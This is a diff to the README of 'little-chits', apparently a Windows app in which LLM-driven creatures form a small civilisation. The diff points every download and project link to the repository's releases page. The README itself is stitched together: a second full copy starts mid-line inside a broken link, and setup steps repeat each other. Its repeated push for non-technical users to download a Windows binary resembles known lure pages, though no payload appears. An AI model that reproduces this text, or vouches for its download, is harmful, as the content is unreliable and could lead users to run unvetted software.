@@ -1,6 +1,6 @@
 # 🐣 little-chits - Watch Tiny AI Minds Grow
 
-[![Download little-chits](https://img.shields.io/badge/Download%20little--chits-ff7a00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/senpai0123/little-chits)
+[![Download little-chits](https://img.shields.io/badge/Download%20little--chits-ff7a00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/senpai0123/little-chits/releases)
 
 little-chits is a living AI civilisation you can watch. Tiny creatures discover things, build new ideas, teach each other, and pass knowledge from one generation to the next. Each creature has an LLM in its mind, so the choices and conversations feel different every time you open the window. You do not need to write code, train a model, or manage a technical setup. You download the application, open it on Windows, and watch the little society grow.
 
@@ -31,7 +31,7 @@ You will also need an LLM option for the creatures’ minds. little-chits suppor
 
 ## 📥 Download and Setup
 
-[Visit this link to download the application](https://github.com/senpai0123/little-chits).
+[Visit this link to download the application](https://github.com/senpai0123/little-chits/releases).
 
 1. Open the download link above.
 2. Visit this link to download the application.
@@ -110,9 +110,9 @@ little-chits is best understood as a living simulation you watch. The interest c
 
 If you enjoy little-chits, visit the project page to share feedback, report issues, or follow updates. The project is built around the idea of a living AI civilisation, and user observations help make the experience better.
 
-[Visit the little-chits project page](https://github.com/senpai0123# 🐣 little-chits - Watch Tiny AI Minds Grow
+[Visit the little-chits project page](https://github.com/senpai0123/little-chits/releases 🐣 little-chits - Watch Tiny AI Minds Grow
 
-[![Download little-chits](https://img.shields.io/badge/Download%20little--chits-8A2BE2?style=for-the-badge&labelColor=FF7A00&logo=github&logoColor=white)](https://github.com/senpai0123/little-chits)
+[![Download little-chits](https://img.shields.io/badge/Download%20little--chits-8A2BE2?style=for-the-badge&labelColor=FF7A00&logo=github&logoColor=white)](https://github.com/senpai0123/little-chits/releases)
 
 little-chits is a living AI civilisation you can watch. Tiny creatures discover things, build new ideas, teach each other, and pass knowledge from one generation to the next. Each creature has an LLM in its mind, so the choices and conversations feel different every time you open the window. You do not need to write code, train a model, or manage a technical setup. You visit the download link, get the application on Windows, and watch the little society grow.
 
@@ -143,7 +143,7 @@ You will also need an LLM option for the creatures’ minds. little-chits suppor
 
 ## 📥 Download and Setup
 
-[![Get little-chits](https://img.shields.io/badge/Get%20little--chits-00C853?style=for-the-badge&labelColor=2962FF&logo=github&logoColor=white)](https://github.com/senpai0123/little-chits)
+[![Get little-chits](https://img.shields.io/badge/Get%20little--chits-00C853?style=for-the-badge&labelColor=2962FF&logo=github&logoColor=white)](https://github.com/senpai0123/little-chits/releases)
 
 Visit this link to download the application.
 
@@ -217,6 +217,6 @@ little-chits is best understood as a living simulation you watch. The interest c
 
 If you enjoy little-chits, visit the project page to share feedback, report issues, or follow updates. The project is built around the idea of a living AI civilisation, and user observations help make the experience better.
 
-[Visit the little-chits project page](https://github.com/senpai0123/little-chits)
+[Visit the little-chits project page](https://github.com/senpai0123/little-chits/releases)
 
 Keywords: agents, ai, artificial-life, llm, local-llm, simulation
